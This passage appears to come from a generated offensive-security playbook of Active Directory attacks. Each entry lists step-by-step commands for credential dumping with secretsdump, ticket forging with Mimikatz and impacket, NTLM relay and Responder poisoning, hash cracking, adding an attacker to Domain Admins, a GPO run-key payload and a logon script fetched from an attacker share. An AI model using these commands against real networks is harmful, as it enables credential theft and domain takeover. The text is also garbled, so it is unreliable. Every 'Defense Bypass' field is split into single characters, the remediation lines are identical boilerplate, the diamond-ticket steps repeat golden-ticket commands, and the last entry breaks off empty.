- Related Tools: 15 — adidnsdump, bloodhound, bloodyad, certify, certipy, coercer, crackmapexec, enum4linux, evil-winrm, gpp-decrypt, impacket, impacket-secretsdump, kerbrute, krbrelayx, ldapnomnom

#### silver-ticket — Silver Ticket Attack
- Zone: active-directory | Category: active-directory | Difficulty: 4
- OS: windows
- Tags: ad, silver-ticket, kerberos, forgery, stealth
- Purpose: Access specific services stealthily using forged service tickets
- When To Use: When you have the NTLM hash of a service account (not krbtgt)
- Prerequisites: Service account NTLM hash, Target service SPN, Domain SID
- Defense Bypass: S, i, l, v, e, r,  , T, i, c, k, e, t, s,  , a, r, e,  , s, t, e, a, l, t, h, i, e, r,  , t, h, a, n,  , G, o, l, d, e, n,  , T, i, c, k, e, t, s,  , a, s,  , t, h, e, y,  , o, n, l, y,  , t, a, r, g, e, t,  , s, p, e, c, i, f, i, c,  , s, e, r, v, i, c, e, s,  , a, n, d,  , d, o, n, ', t,  , r, e, q, u, i, r, e,  , k, r, b, t, g, t,  , h, a, s, h
- Remediation: Enforce LDAP signing, disable legacy authentication, implement tiering
- MITRE ID: T1558.002
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Obtain service account hash', 'command': 'impacket-secretsdump -just-dc-user svc_account domain/da:pass@DC', 'note': 'Or from DCSync, SAM dump, or NTLM relay'}
  2. {'step': 2, 'description': 'Forge Silver Ticket with Mimikatz', 'command': 'mimikatz # kerberos::golden /user:admin /domain:domain.local /sid:SID /target:server.domain /service:cifs /rc4:SVC_HASH /ptt', 'note': 'rc4 = NTLM hash of service account'}
  3. {'step': 3, 'description': 'Access specific service with ticket', 'command': 'dir \\\\server.domain\\c$', 'note': 'Access only the specific service (cifs in this example)'}
  4. {'step': 4, 'description': 'Alternative: forge with impacket-ticketer', 'command': 'impacket-ticketer -nthash SVC_HASH -domain-sid SID -domain domain.local -service cifs -target server.domain admin', 'note': 'Creates ccache file for specific service access'}
- Related Tools: 15 — adidnsdump, bloodhound, bloodyad, certify, certipy, coercer, crackmapexec, enum4linux, evil-winrm, gpp-decrypt, impacket, impacket-secretsdump, kerbrute, krbrelayx, ldapnomnom

#### diamond-ticket — Diamond Ticket Attack
- Zone: active-directory | Category: active-directory | Difficulty: 5
- OS: windows
- Tags: ad, diamond-ticket, kerberos, advanced-persistence
- Purpose: Create undetectable forged TGT using real PAC structure
- When To Use: When krbtgt hash is available and evasion from ticket auditing is required
- Prerequisites: krbtgt NTLM hash, Domain SID, Understanding of PAC structure
- Defense Bypass: D, i, a, m, o, n, d,  , T, i, c, k, e, t, s,  , a, r, e,  , h, a, r, d, e, r,  , t, o,  , d, e, t, e, c, t,  , t, h, a, n,  , G, o, l, d, e, n,  , T, i, c, k, e, t, s,  , d, u, e,  , t, o,  , v, a, l, i, d,  , P, A, C,  , s, t, r, u, c, t, u, r, e, ;,  , s, t, i, l, l,  , m, o, n, i, t, o, r,  , f, o, r,  , k, r, b, t, g, t,  , h, a, s, h,  , e, x, t, r, a, c, t, i, o, n
- Remediation: Enforce LDAP signing, disable legacy authentication, implement tiering
- MITRE ID: T1558.001
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Obtain krbtgt hash via DCSync', 'command': 'impacket-secretsdump -just-dc domain/da:pass@DC', 'note': 'Requires DA/DC-sync rights'}
  2. {'step': 2, 'description': 'Decrypt real TGT to understand PAC structure', 'command': 'mimikatz # kerberos::list /export', 'note': 'Export real TGT to study PAC structure'}
  3. {'step': 3, 'description': 'Forge Diamond Ticket with correct PAC', 'command': 'mimikatz # kerberos::golden /user:admin /domain:domain /sid:SID /krbtgt:KRBGT_HASH /ptt', 'note': 'Diamond ticket uses real PAC, not synthetic'}
  4. {'step': 4, 'description': 'Use forged ticket', 'command': 'klist && impacket-psexec -k -no-pass domain/admin@target', 'note': 'Ticket appears more legitimate than Golden Ticket'}
- Related Tools: 15 — adidnsdump, bloodhound, bloodyad, certify, certipy, coercer, crackmapexec, enum4linux, evil-winrm, gpp-decrypt, impacket, impacket-secretsdump, kerbrute, krbrelayx, ldapnomnom

#### ntlm-relay — NTLM Relay Attack
- Zone: active-directory | Category: active-directory | Difficulty: 3
- OS: windows, linux
- Tags: ad, ntlm-relay, smb, authentication
- Purpose: Relay captured NTLM authentication to gain access to services
- When To Use: When NTLM authentication is observed and SMB signing is not required on target
- Prerequisites: NTLM auth source (Responder, coercion), Target service that accepts NTLM without signing, ntlmrelayx tool
- Defense Bypass: S, M, B,  , s, i, g, n, i, n, g,  , r, e, q, u, i, r, e, m, e, n, t,  , b, l, o, c, k, s,  , r, e, l, a, y, ;,  , L, D, A, P,  , s, i, g, n, i, n, g,  , a, n, d,  , c, h, a, n, n, e, l,  , b, i, n, d, i, n, g,  , a, l, s, o,  , m, i, t, i, g, a, t, e, .,  , M, o, d, e, r, n,  , W, i, n, d, o, w, s,  , h, a, s,  , m, i, t, i, g, a, t, i, o, n, s,  , b, u, t,  , m, i, s, c, o, n, f, i, g, u, r, a, t, i, o, n, s,  , e, x, i, s, t, .
- Remediation: Enforce LDAP signing, disable legacy authentication, implement tiering
- MITRE ID: T1187
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Start NTLM relay listener', 'command': 'ntlmrelayx.py -tf targets.txt -smb2support', 'note': 'targets.txt contains target IPs and protocols'}
  2. {'step': 2, 'description': 'Capture NTLM auth via Responder', 'command': 'responder -I eth0 -wrf', 'note': "Disable Responder's SMB server to avoid conflict with relay"}
  3. {'step': 3, 'description': 'Relay to LDAP for AD object manipulation', 'command': 'ntlmrelayx.py -t ldap://DC_IP -smb2support', 'note': 'Relaying to LDAP allows adding users to groups, modifying ACLs'}
  4. {'step': 4, 'description': 'Relay to AD CS for ESC8', 'command': 'ntlmrelayx.py -t http://DC_IP/certsrv/certfnsh.asp --adcs --template DomainController', 'note': 'Escalates to certificate-based auth'}
- Related Tools: 15 — adidnsdump, bloodhound, bloodyad, certify, certipy, coercer, crackmapexec, enum4linux, evil-winrm, gpp-decrypt, impacket, impacket-secretsdump, jwt_tool, kerbrute, krbrelayx

#### llmnr-poisoning — LLMNR/NBT-NS Poisoning
- Zone: active-directory | Category: active-directory | Difficulty: 2
- OS: windows, linux
- Tags: ad, llmnr, nbns, poisoning, ntlm, hash-capture
- Purpose: Capture NTLMv2 hashes by poisoning LLMNR/NBT-NS broadcasts
- When To Use: On local networks where LLMNR/NBT-NS is enabled (default on most Windows networks)
- Prerequisites: Network access to broadcast domain, LLMNR/NBT-NS enabled on targets, Responder tool
- Defense Bypass: D, i, s, a, b, l, e,  , L, L, M, N, R, /, N, B, T, -, N, S,  , v, i, a,  , G, r, o, u, p,  , P, o, l, i, c, y, .,  , M, o, n, i, t, o, r,  , f, o, r,  , u, n, u, s, u, a, l,  , N, B, T, -, N, S, /, L, L, M, N, R,  , r, e, s, p, o, n, s, e, s, .
- Remediation: Enforce LDAP signing, disable legacy authentication, implement tiering
- MITRE ID: T1557.001
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Start Responder for hash capture', 'command': 'responder -I eth0 -wrf', 'note': '-w enables WPAD rogue server, -r enables NBT-NS response'}
  2. {'step': 2, 'description': 'Trigger name resolution failure', 'command': 'From Windows host: ping NONEXISTENT.local', 'note': 'Any failed DNS query triggers LLMNR/NBT-NS fallback'}
  3. {'step': 3, 'description': 'Capture NTLMv2 hashes', 'command': 'Responder captures hashes in /usr/share/responder/logs/', 'note': 'Hashes are NTLMv2 challenge-response, crackable offline'}
  4. {'step': 4, 'description': 'Crack captured hashes', 'command': 'hashcat -m 5600 ntlmv2_hash.txt /usr/share/wordlists/rockyou.txt', 'note': 'NTLMv2 hashes use hashcat mode 5600'}
- Related Tools: 15 — adidnsdump, bloodhound, bloodyad, certify, certipy, coercer, crackmapexec, enum4linux, evil-winrm, gpp-decrypt, hashcat, impacket, impacket-secretsdump, kerbrute, krbrelayx

#### ipv6-mitm — IPv6 MITM with mitm6
- Zone: active-directory | Category: active-directory | Difficulty: 3
- OS: linux, windows
- Tags: ad, ipv6, mitm, dns, ntlm-relay
- Purpose: Redirect Windows authentication via IPv6 DNS takeover for NTLM relay
- When To Use: When IPv6 is enabled on the domain (default on modern Windows)
- Prerequisites: IPv6 enabled on network, ntlmrelayx running, Domain credentials for relay target
- Defense Bypass: D, i, s, a, b, l, e,  , I, P, v, 6,  , o, n,  , d, o, m, a, i, n,  , h, o, s, t, s,  , o, r,  , m, o, n, i, t, o, r,  , f, o, r,  , u, n, a, u, t, h, o, r, i, z, e, d,  , D, H, C, P, v, 6, /, D, N, S,  , s, e, r, v, e, r, s
- Remediation: Enforce LDAP signing, disable legacy authentication, implement tiering
- MITRE ID: T1557.001
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Start mitm6 DNS takeover', 'command': 'mitm6 -d domain.local', 'note': 'Poison DNS for domain.local to point to attacker'}
  2. {'step': 2, 'description': 'Start ntlmrelayx to relay auth', 'command': 'ntlmrelayx.py -6 -t ldap://DC_IP -smb2support', 'note': '-6 enables IPv6 relay; targets LDAP on DC'}
  3. {'step': 3, 'description': 'Windows hosts automatically authenticate', 'command': 'Automatic - mitm6 triggers DNS queries from Windows hosts', 'note': 'No user interaction required; hosts query IPv6 DNS'}
  4. {'step': 4, 'description': 'Relayed auth grants AD access', 'command': 'ntlmrelayx adds attacker to Domain Admins or dumps secrets', 'note': 'Full AD compromise via IPv6 MITM without credentials'}
- Related Tools: 15 — adidnsdump, amass, beroot, bloodhound, bloodyad, certify, certipy, coercer, crackmapexec, enum4linux, evil-winrm, godpotato, gpp-decrypt, impacket, impacket-secretsdump

#### acl-abuse-genericall — ACL Abuse — GenericAll
- Zone: active-directory | Category: active-directory | Difficulty: 3
- OS: windows
- Tags: ad, acl, genericall, privilege-escalation
- Purpose: Full control of AD objects for privilege escalation and persistence
- When To Use: When BloodHound or ACL analysis shows GenericAll on users/groups/computers
- Prerequisites: GenericAll permission on target object, Valid domain credentials
- Defense Bypass: A, C, L,  , c, h, a, n, g, e, s,  , m, a, y,  , b, e,  , l, o, g, g, e, d, ;,  , G, e, n, e, r, i, c, A, l, l,  , o, n,  , s, e, r, v, i, c, e,  , a, c, c, o, u, n, t, s,  , i, s,  , h, i, g, h, -, v, a, l, u, e,  , b, u, t,  , m, o, n, i, t, o, r, e, d
- Remediation: Enforce LDAP signing, disable legacy authentication, implement tiering
- MITRE ID: T1078
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Identify GenericAll permissions via BloodHound', 'command': 'BloodHound: search for GenericAll edges owned by your user', 'note': 'Or: PowerView Find-InterestingDomainAcl'}
  2. {'step': 2, 'description': 'Reset target user password', 'command': "Set-ADAccountPassword -Identity TargetUser -Reset -NewPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)", 'note': 'GenericAll on user allows password reset'}
  3. {'step': 3, 'description': 'Add self to privileged group', 'command': "Add-ADGroupMember -Identity 'Domain Admins' -Members AttackerUser", 'note': 'GenericAll on group allows adding members'}
  4. {'step': 4, 'description': 'Verify escalation', 'command': 'whoami /groups && net user AttackerUser /domain', 'note': 'Confirm group membership and access'}
- Related Tools: 15 — accesschk, adidnsdump, bloodhound, bloodyad, certify, certipy, coercer, crackmapexec, enum4linux, evil-winrm, find, getcap, gpp-decrypt, icacls, impacket

#### acl-abuse-writedacl — ACL Abuse — WriteDACL
- Zone: active-directory | Category: active-directory | Difficulty: 3
- OS: windows
- Tags: ad, acl, writedacl, dacl, privilege-escalation
- Purpose: Modify object DACLs to grant additional access rights
- When To Use: When you have WriteDACL on a high-value target (users, groups, DNS admin)
- Prerequisites: WriteDACL permission on target, Valid domain credentials
- Defense Bypass: D, A, C, L,  , m, o, d, i, f, i, c, a, t, i, o, n, s,  , a, r, e,  , l, o, g, g, e, d,  , i, n,  , S, e, c, u, r, i, t, y,  , E, v, e, n, t,  , L, o, g, ;,  , m, a, y,  , t, r, i, g, g, e, r,  , S, I, E, M,  , a, l, e, r, t, s
- Remediation: Enforce LDAP signing, disable legacy authentication, implement tiering
- MITRE ID: T1078
- Command: #
- Steps (3):
  1. {'step': 1, 'description': 'Identify WriteDACL targets', 'command': "Find-InterestingDomainAcl | Where-Object {$_ -match 'WriteDacl'}", 'note': 'PowerView cmdlet to find writable ACLs'}
  2. {'step': 2, 'description': 'Grant self GenericAll via WriteDACL', 'command': "Add-DomainObjectAcl -TargetIdentity 'Domain Admins' -PrincipalIdentity AttackerUser -Rights All", 'note': 'PowerView adds GenericAll for attacker on target group'}
  3. {'step': 3, 'description': 'Exploit newly granted GenericAll', 'command': "Add-ADGroupMember -Identity 'Domain Admins' -Members AttackerUser", 'note': 'Now can add self to Domain Admins'}
- Related Tools: 15 — accesschk, adidnsdump, bloodhound, bloodyad, certify, certipy, coercer, crackmapexec, enum4linux, evil-winrm, find, getcap, gpp-decrypt, icacls, impacket

#### acl-abuse-forcechangepassword — ACL Abuse — ForceChangePassword
- Zone: active-directory | Category: active-directory | Difficulty: 2
- OS: windows
- Tags: ad, acl, forcechangepassword, password-reset
- Purpose: Reset target user password without knowing current password
- When To Use: When you have ForceChangePassword extended right on a privileged user
- Prerequisites: ForceChangePassword permission on target user, Valid domain credentials
- Defense Bypass: P, a, s, s, w, o, r, d,  , c, h, a, n, g, e, s,  , a, r, e,  , l, o, g, g, e, d, ;,  , F, o, r, c, e, C, h, a, n, g, e, P, a, s, s, w, o, r, d,  , a, b, u, s, e,  , o, n,  , s, e, r, v, i, c, e,  , a, c, c, o, u, n, t, s,  , i, s,  , h, i, g, h, -, v, a, l, u, e,  , t, a, r, g, e, t
- Remediation: Enforce LDAP signing, disable legacy authentication, implement tiering
- MITRE ID: T1098
- Command: #
- Steps (3):
  1. {'step': 1, 'description': 'Identify ForceChangePassword targets', 'command': "Get-DomainUser -TrustedToAuth | Get-ObjectAcl -ResolveGUIDs | ? {($_.ObjectAceType -match 'force-change-password')}", 'note': 'PowerView to find users with ForceChangePassword extended right'}
  2. {'step': 2, 'description': 'Reset target password', 'command': "Set-DomainUserPassword -Identity TargetUser -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)", 'note': 'Sets new password without knowing old one'}
  3. {'step': 3, 'description': 'Authenticate with new credentials', 'command': 'impacket-psexec domain/targetuser:NewPass123@TARGET', 'note': 'If target is privileged, full compromise achieved'}
- Related Tools: 15 — adidnsdump, bloodhound, bloodyad, certify, certipy, cewl, coercer, crackmapexec, crunch, enum4linux, evil-winrm, gpp-decrypt, impacket, impacket-secretsdump, kerbrute

#### acl-abuse-addmember — ACL Abuse — AddMember
- Zone: active-directory | Category: active-directory | Difficulty: 2
- OS: windows
- Tags: ad, acl, addmember, group-membership, privilege-escalation
- Purpose: Add attacker account to privileged groups
- When To Use: When you have WriteProperty or AddMember permission on a high-privilege group
- Prerequisites: AddMember/WriteProperty permission on target group, Valid domain credentials
- Defense Bypass: G, r, o, u, p,  , m, e, m, b, e, r, s, h, i, p,  , c, h, a, n, g, e, s,  , a, r, e,  , l, o, g, g, e, d, ;,  , a, d, d, i, n, g,  , t, o,  , D, o, m, a, i, n,  , A, d, m, i, n, s,  , t, r, i, g, g, e, r, s,  , h, i, g, h, -, s, e, v, e, r, i, t, y,  , a, l, e, r, t, s
- Remediation: Enforce LDAP signing, disable legacy authentication, implement tiering
- MITRE ID: T1098.001
- Command: #
- Steps (3):
  1. {'step': 1, 'description': 'Identify groups with AddMember', 'command': 'net group "Domain Admins" /domain', 'note': 'Check current membership; then find AddMember rights'}
  2. {'step': 2, 'description': 'Add self to group via PowerView', 'command': "Add-DomainGroupMember -Identity 'Domain Admins' -Members AttackerUser", 'note': "Requires WriteProperty on group's member attribute"}
  3. {'step': 3, 'description': 'Verify group membership', 'command': 'net user AttackerUser /domain && whoami /groups', 'note': 'Confirm DA membership and access'}
- Related Tools: 15 — accesschk, adidnsdump, bloodhound, bloodyad, certify, certipy, coercer, crackmapexec, enum4linux, evil-winrm, find, getcap, gpp-decrypt, icacls, impacket

#### acl-abuse-genericwrite — ACL Abuse — GenericWrite
- Zone: active-directory | Category: active-directory | Difficulty: 3
- OS: windows
- Tags: ad, acl, genericwrite, kerberoasting, persistence
- Purpose: Modify AD object attributes for privilege escalation or persistence
- When To Use: When you have GenericWrite on a user, computer, or group object
- Prerequisites: GenericWrite permission on target object, Valid domain credentials
- Defense Bypass: A, t, t, r, i, b, u, t, e,  , m, o, d, i, f, i, c, a, t, i, o, n, s,  , a, r, e,  , l, o, g, g, e, d,  , i, n,  , D, i, r, e, c, t, o, r, y,  , S, e, r, v, i, c, e,  , c, h, a, n, g, e, s, ;,  , G, e, n, e, r, i, c, W, r, i, t, e,  , o, n,  , s, e, r, v, i, c, e,  , a, c, c, o, u, n, t, s,  , i, s,  , h, i, g, h, -, r, i, s, k
- Remediation: Enforce LDAP signing, disable legacy authentication, implement tiering
- MITRE ID: T1098
- Command: #
- Steps (3):
  1. {'step': 1, 'description': 'Identify GenericWrite targets', 'command': "Find-InterestingDomainAcl | Where-Object {$_ -match 'GenericWrite'}", 'note': 'PowerView finds objects with GenericWrite ACEs'}
  2. {'step': 2, 'description': 'Set SPN on target user (for Kerberoasting)', 'command': "Set-DomainUser -Identity TargetUser -ServicePrincipalName 'FakeSPN/Target'", 'note': 'Adds SPN to user; if user has weak password, can be Kerberoasted'}
  3. {'step': 3, 'description': "Or modify user's logon script", 'command': "Set-DomainUser -Identity TargetUser -ScriptPath '\\\\attacker\\share\\evil.bat'", 'note': 'When user logs on, malicious script executes'}
- Related Tools: 15 — adidnsdump, bloodhound, bloodyad, certify, certipy, coercer, crackmapexec, enum4linux, evil-winrm, gpp-decrypt, impacket, impacket-secretsdump, kerbrute, krbrelayx, ldapnomnom

#### gpo-abuse — GPO Abuse
- Zone: active-directory | Category: active-directory | Difficulty: 4
- OS: windows
- Tags: ad, gpo, group-policy, persistence, domain-wide
- Purpose: Modify GPOs to execute commands, deploy credentials, or create backdoors across the domain
- When To Use: When you have GenericWrite/GenericAll on GPO objects or can create/modify GPOs
- Prerequisites: GPO edit permissions, Valid domain credentials, Domain-joined targets to receive GPO
- Defense Bypass: G, P, O,  , c, h, a, n, g, e, s,  , a, r, e,  , l, o, g, g, e, d, ;,  , m, o, d, i, f, y, i, n, g,  , G, P, O, s,  , l, i, n, k, e, d,  , t, o,  , O, U, s,  , a, f, f, e, c, t, s,  , m, a, n, y,  , m, a, c, h, i, n, e, s,  , s, i, m, u, l, t, a, n, e, o, u, s, l, y
- Remediation: Enforce LDAP signing, disable legacy authentication, implement tiering
- MITRE ID: T1484.001
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Enumerate GPOs', 'command': 'Get-GPO -All | Select DisplayName, Id, GpoStatus', 'note': 'PowerShell AD module or ldapsearch for groupPolicyContainer'}
  2. {'step': 2, 'description': 'Identify writable GPOs', 'command': '(Get-DomainGPO).Name | ForEach-Object { $gpo = Get-GPO -Name $_; $acl = Get-GPPermission -Guid $gpo.Id; ... }', 'note': 'Check ACLs for GenericWrite/GenericAll on GPO objects'}
  3. {'step': 3, 'description': 'Modify GPO to add malicious action', 'command': "Set-GPRegistryValue -Name 'GPO_NAME' -Key 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -ValueName 'Evil' -Value 'cmd.exe /c payload' -Type String", 'note': 'Pushes registry run key to all affected computers'}
  4. {'step': 4, 'description': 'Force GPO update', 'command': 'gpupdate /force (on targets) or wait for next GPO refresh', 'note': 'GPOs apply on next refresh or forced update'}
- Related Tools: 15 — adidnsdump, bloodhound, bloodyad, certify, certipy, coercer, crackmapexec, enum4linux, evil-winrm, gpp-decrypt, impacket, impacket-secretsdump, kerbrute, krbrelayx, lazagne

#### pass-the-ticket — Pass-the-Ticket (PTT)
- Zone: active-directory | Category: active-directory | Difficulty: 2
- OS: windows
- Tags: ad, kerberos, pass-the-ticket, lateral-movement
- Purpose: Authenticate using stolen Kerberos tickets without password
- When To Use: When you have obtained a valid Kerberos ticket for a privileged user
- Prerequisites: Valid Kerberos ticket (.kirbi/.ccache), Ticket for target service/user
- Defense Bypass: K, e, r, b, e, r, o, s,  , t, i, c, k, e, t, s,  , h, a, v, e,  , l, i, m, i, t, e, d,  , l, i, f, e, t, i, m, e, s, ;,  , T, i, c, k, e, t,  , G, r, a, n, t, i, n, g,  , T, i, c, k, e, t, s,  , (, T, G, T, s, ),  , l, a, s, t,  , 1, 0,  , h, o, u, r, s,  , b, y,  , d, e, f, a, u, l, t
- Remediation: Enforce LDAP signing, disable legacy authentication, implement tiering
- MITRE ID: T1550.003
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Obtain Kerberos ticket', 'command': 'From DCSync, Golden/Silver Ticket, or harvested from memory', 'note': 'Tickets can be .kirbi (Windows) or .ccache (Linux/impacket)'}
  2. {'step': 2, 'description': 'Convert ticket format if needed', 'command': 'ticket_converter.py ticket.kirbi ticket.ccache', 'note': 'Convert between Windows and impacket formats'}
  3. {'step': 3, 'description': 'Inject ticket into session (Windows)', 'command': 'mimikatz # kerberos::ptt Administrator.kirbi', 'note': 'Injects ticket into current Kerberos cache'}
  4. {'step': 4, 'description': 'Use injected ticket', 'command': 'klist (verify) && dir \\\\DC.domain\\c$', 'note': 'Authenticate to services using injected ticket'}
- Related Tools: 15 — adidnsdump, bloodhound, bloodyad, certify, certipy, cewl, chisel, coercer, crackmapexec, crunch, enum4linux, evil-winrm, gpp-decrypt, impacket, impacket-secretsdump

#### overpass-the-hash — Overpass-the-Hash
- Zone: active-directory | Category: active-directory | Difficulty: 3
- OS: windows, linux
- Tags: ad, kerberos, overpass-the-hash, ntlm, lateral-movement
- Purpose: Convert NTLM hash to Kerberos TGT for Kerberos-based lateral movement
- When To Use: When you have NTLM hash but want to use Kerberos (avoids NTLM auth logging)
- Prerequisites: NTLM hash of domain user, Access to DC's Kerberos port (88)
- Defense Bypass: K, e, r, b, e, r, o, s,  , a, u, t, h,  , g, e, n, e, r, a, t, e, s,  , d, i, f, f, e, r, e, n, t,  , l, o, g, s,  , t, h, a, n,  , N, T, L, M, ;,  , m, a, y,  , b, y, p, a, s, s,  , s, o, m, e,  , N, T, L, M, -, f, o, c, u, s, e, d,  , d, e, t, e, c, t, i, o, n
- Remediation: Enforce LDAP signing, disable legacy authentication, implement tiering
- MITRE ID: T1550.002
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Request TGT using NTLM hash', 'command': 'impacket-getTGT domain/user -hashes :NTLM_HASH', 'note': 'Uses NTLM hash to request Kerberos TGT from DC'}
  2. {'step': 2, 'description': 'Set Kerberos cache environment', 'command': 'export KRB5CCNAME=user.ccache', 'note': 'Points Kerberos library to obtained ticket cache'}
  3. {'step': 3, 'description': 'Use Kerberos ticket for authentication', 'command': 'impacket-psexec -k -no-pass domain/user@target', 'note': 'Authenticates using Kerberos ticket instead of NTLM'}
  4. {'step': 4, 'description': 'Alternative with Rubeus', 'command': 'Rubeus.exe asktgt /user:User /rc4:NTLM_HASH /ptt', 'note': 'Rubeus alternative for Windows environments'}
- Related Tools: 15 — adidnsdump, bloodhound, bloodyad, certify, certipy, chisel, coercer, crackmapexec, enum4linux, evil-winrm, gpp-decrypt, impacket, impacket-secretsdump, kerbrute, krbrelayx

#### kerberos-delegation-enum — Delegation Enumeration
- Zone: active-directory | Category: active-directory | Difficulty: 2
- OS: windows, linux
- Tags: ad, delegation, enumeration, unconstrained, constrained, rbcd
- Purpose: Map all delegation paths for potential exploitation
- When To Use: During AD enumeration phase to identify high-value targets
- Prerequisites: LDAP access to domain, Valid credentials
- Defense Bypass: D, e, l, e, g, a, t, i, o, n,  , e, n, u, m, e, r, a, t, i, o, n,  , i, s,  , p, a, s, s, i, v, e, /, l, o, w, -, n, o, i, s, e, ;,  , s, t, a, n, d, a, r, d,  , A, D,  , q, u, e, r, y,  , a, c, t, i, v, i, t, y
- Remediation: Enforce LDAP signing, disable legacy authentication, implement tiering
- MITRE ID: T1087.002
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Enumerate unconstrained delegation', 'command': 'Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation', 'note': 'PowerShell AD module'}
  2. {'step': 2, 'description': 'Enumerate constrained delegation', 'command': "Get-ADComputer -Filter {msDS-AllowedToDelegateTo -like '*'} -Properties msDS-AllowedToDelegateTo", 'note': 'Shows accounts with constrained delegation'}
  3. {'step': 3, 'description': 'Enumerate RBCD', 'command': "Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | ? {$_.'msDS-AllowedToActOnBehalfOfOtherIdentity'}", 'note': 'Shows computers allowing RBCD'}
  4. {'step': 4, 'description': 'Export for BloodHound', 'command': 'bloodhound-python -u User -p Pass -d DOMAIN -ns DC_IP -c All', 'note': 'BloodHound visualizes all delegation paths'}
- Related Tools: 15 — adidnsdump, beroot, bloodhound, bloodyad, certify, certipy, coercer, commix, crackmapexec, enum4linux, evil-winrm, gdb, gpp-decrypt, impacket, impacket-secretsdump

#### pre2k-attack — Pre-2000 Computer Account Attack
- Zone: active-directory | Category: active-directory | Difficulty: 3
- OS: windows
- Tags: ad, pre2k, computer-accounts, legacy, password-prediction
- Purpose: Calculate and exploit weak pre-2000 computer account passwords
- When To Use: When legacy computer accounts (Windows 2000 or earlier style) exist in the domain
- Prerequisites: Computer account name in domain, Domain functional level supporting pre-2000 accounts
- Defense Bypass: C, o, m, p, u, t, e, r,  , a, c, c, o, u, n, t,  , a, u, t, h, e, n, t, i, c, a, t, i, o, n,  , g, e, n, e, r, a, t, e, s,  , l, o, g, s, ;,  , p, r, e, d, i, c, t, a, b, l, e,  , p, a, s, s, w, o, r, d, s,  , a, r, e,  , a,  , l, e, g, a, c, y,  , A, D,  , w, e, a, k, n, e, s, s
- Remediation: Enforce LDAP signing, disable legacy authentication, implement tiering
- MITRE ID: T1110
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Enumerate computer accounts', 'command': "nxc smb DC_IP -u '' -p '' --computers", 'note': 'Get list of computer account names'}
  2. {'step': 2, 'description': 'Calculate machine account passwords', 'command': 'pre2k.py -d DOMAIN --dc DC_IP -u User -p Pass --mode machines', 'note': 'Pre2K calculates predictable passwords'}
  3. {'step': 3, 'description': 'Authenticate with calculated hash', 'command': 'impacket-psexec -hashes :CALCULATED_HASH domain/COMPUTER_NAME$@TARGET', 'note': 'Computer account auth often grants local admin on the machine'}
  4. {'step': 4, 'description': 'Dump SAM or escalate', 'command': 'impacket-secretsdump domain/COMPUTER_NAME$:CALCULATED_HASH@TARGET', 'note': 'Computer account hash often grants local SYSTEM access'}
- Related Tools: 15 — adidnsdump, bloodhound, bloodyad, certify, certipy, coercer, crackmapexec, enum4linux, evil-winrm, gpp-decrypt, impacket, impacket-secretsdump, kerbrute, krbrelayx, ldapnomnom

#### trust-abuse — Domain Trust Abuse
- Zone: active-directory | Category: active-directory | Difficulty: 4
- OS: windows
- Tags: ad, trust, cross-domain, forest, sid-history
- Purpose: Escalate privileges across domain/forest trust boundaries
- When To Use: When multiple domains/forests are present and trust relationships exist
- Prerequisites: Access to at least one domain in trust relationship, Understanding of trust direction/type
- Defense Bypass: T, r, u, s, t,  , a, b, u, s, e,  , r, e, q, u, i, r, e, s,  , u, n, d, e, r, s, t, a, n, d, i, n, g,  , o, f,  , t, r, u, s, t,  , d, i, r, e, c, t, i, o, n, ;,  , c, r, o, s, s, -, f, o, r, e, s, t,  , a, t, t, a, c, k, s,  , a, r, e,  , n, o, i, s, y,  , d, u, e,  , t, o,  , a, d, d, i, t, i, o, n, a, l,  , a, u, t, h, e, n, t, i, c, a, t, i, o, n,  , h, o, p, s
- Remediation: Enforce LDAP signing, disable legacy authentication, implement tiering
- MITRE ID: T1482
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Enumerate trust relationships', 'command': 'Get-ADTrust -Filter * | Select Name, TrustType, TrustDirection', 'note': 'PowerShell or ldapsearch for objectClass=trustedDomain'}
  2. {'step': 2, 'description': 'Identify foreign security principals', 'command': "ldapsearch -x ... '(objectClass=foreignSecurityPrincipal)'", 'note': 'FSPs represent users/groups from trusted domains'}
  3. {'step': 3, 'description': 'Forge trust ticket (inter-realm TGT)', 'command': 'impacket-ticketer -nthash KRBGT_HASH -domain-sid TRUSTED_SID -domain trusted.domain user', 'note': 'Creates inter-realm TGT for trust abuse'}
  4. {'step': 4, 'description': 'Use ticket to access trusted domain', 'command': 'export KRB5CCNAME=user.ccache && impacket-psexec -k -no-pass trusted.domain/user@DC', 'note': 'Cross-domain access via forged trust ticket'}
- Related Tools: 15 — adidnsdump, bloodhound, bloodyad, certify, certipy, coercer, crackmapexec, enum4linux, evil-winrm, gpp-decrypt, impacket, impacket-secretsdump, kerbrute, krbrelayx, ldapnomnom

#### always-install-elevated — Always Install Elevated
- Zone: privilege-escalation | Category: privilege-escalation | Difficulty: 2
- OS: windows
- Tags: privesc, windows, msi, always-install-elevated, registry
- Purpose: Install malicious MSI packages as SYSTEM to gain code execution
- When To Use: When checking Windows registry for AlwaysInstallElevated policy
- Prerequisites: AlwaysInstallElevated = 1 in both HKLM and HKCU, MSI installation capability
- Defense Bypass: M, S, I,  , i, n, s, t, a, l, l, a, t, i, o, n,  , g, e, n, e, r, a, t, e, s,  , W, i, n, d, o, w, s,  , I, n, s, t, a, l, l, e, r,  , l, o, g, s, ;,  , A, l, w, a, y, s, I, n, s, t, a, l, l, E, l, e, v, a, t, e, d,  , i, s,  , a,  , G, r, o, u, p,  , P, o, l, i, c, y,  , s, e, t, t, i, n, g
- Remediation: Apply patches, enforce least privilege, disable SUID/SGID bits
- MITRE ID: T1548.002
- Command: #
- Steps (4):
